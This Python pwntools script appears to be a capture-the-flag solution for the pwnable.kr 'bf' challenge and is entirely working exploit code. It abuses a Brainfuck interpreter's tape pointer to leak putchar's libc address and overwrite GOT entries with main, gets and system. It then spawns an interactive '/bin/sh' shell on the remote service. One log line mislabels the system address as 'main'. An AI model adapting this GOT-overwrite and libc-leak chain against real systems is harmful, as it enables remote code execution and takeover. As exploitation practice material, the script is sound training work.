#!/usr/bin/python
__author__ = "TaQini"
from pwn import *

# context.log_level = 'debug'
# p = process('bf')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('bf_libc.so')
p = remote('pwnable.kr',9001)

def back(n):
	return '<'*n
def read(n):
	return '.>'*n
def write(n):
	return ',>'*n

putchar_got = 0x0804A030
memset_got  = 0x0804A02C
fgets_got 	= 0x0804A010
ptr 		= 0x0804A0A0

# leak putchar_addr
payload =  back(ptr - putchar_got) + '.' + read(4) 
# overwrite putchar_got to main_addr
payload += back(4) + write(4) 
# overwrite memset_got to gets_addr
payload += back(putchar_got - memset_got + 4) + write(4) 
# overwrite fgets_got to system_addr
payload += back(memset_got - fgets_got + 4) + write(4) 
# JUMP to main
payload += '.'

p.recvuntil('[ ]\n')
#gdb.attach(p)
p.sendline(payload)
p.recv(1) # junkcode

putchar_libc = libc.symbols['putchar']
gets_libc	 = libc.symbols['gets']
system_libc  = libc.symbols['system']

putchar = u32(p.recv(4))
log.success("putchar = "+ hex(putchar))

gets    = putchar - putchar_libc + gets_libc
log.success("gets = "	+ hex(gets))

system  = putchar - putchar_libc + system_libc
log.success("system = "	+ hex(system))

main	= 0x08048671
log.success("main = "	+ hex(system))

p.send(p32(main))
p.send(p32(gets))
p.send(p32(system))

p.sendline('//bin/sh\0')
p.interactive()